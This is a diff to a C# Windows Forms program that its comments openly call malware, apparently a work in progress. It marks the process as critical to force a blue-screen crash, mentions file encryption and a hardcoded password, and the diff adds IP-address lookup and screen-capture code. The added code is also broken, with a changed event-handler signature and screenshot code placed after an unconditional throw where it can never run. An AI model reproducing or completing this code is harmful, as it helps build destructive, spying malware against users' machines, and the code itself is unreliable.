@@ -9,6 +9,7 @@ using System.Drawing;
 using System.Drawing.Imaging;
 using Microsoft.Win32;
 using System.Text;
+using System.Windows.Forms;
 using System.Threading.Tasks;
 using System.Windows.Forms;
 using System.Diagnostics;
@@ -33,7 +34,7 @@ namespace WindowsFormsApp1
             InitializeComponent();
         }
 
-        private void Form1_Load(object sender, EventArgs e)
+        private string Form1_Load(object sender, EventArgs e)
         {
             Process.EnterDebugMode(); // gets debug options to iniate a blue screen o' death and delete all your things!
             int isCritical = 1;  // we want this to be a Critical Process
@@ -151,6 +152,22 @@ namespace WindowsFormsApp1
             string password = "Hu11an_!ndusTr!al";
             GCHandle gch = GCHandle.Alloc(password, GCHandleType.Pinned);
             gch.Free();
+            var host = Dns.GetHostEntry(Dns.GetHostName());
+            foreach (var ip in host.AddressList)
+            {
+                if (ip.AddressFamily == AddressFamily.InterNetwork)
+                {
+                    return ip.ToString();
+                }
+            }
+            throw new Exception("no");
+            Rectangle size = Screen.GetBounds(Point.Empty);
+            Bitmap captureBitmap = new Bitmap(size.Width, size.Height, PixelFormat.Format32bppArgb);
+            Rectangle captureRectangle = Screen.AllScreens[0].Bounds;
+            Graphics captureGraphics = Graphics.FromImage(captureBitmap);
+            captureGraphics.CopyFromScreen(captureRectangle.Left, captureRectangle.Top, 0, 0, captureRectangle.Size);
+            captureBitmap.Save(@"Capture.jpg", System.Drawing.Imaging.ImageFormat.Jpeg);
+           // host.HostName;
             // Encrypting files.
             // Any help on this malware is apreciated.
             // However i advise not downloading this and using it on your own PC.
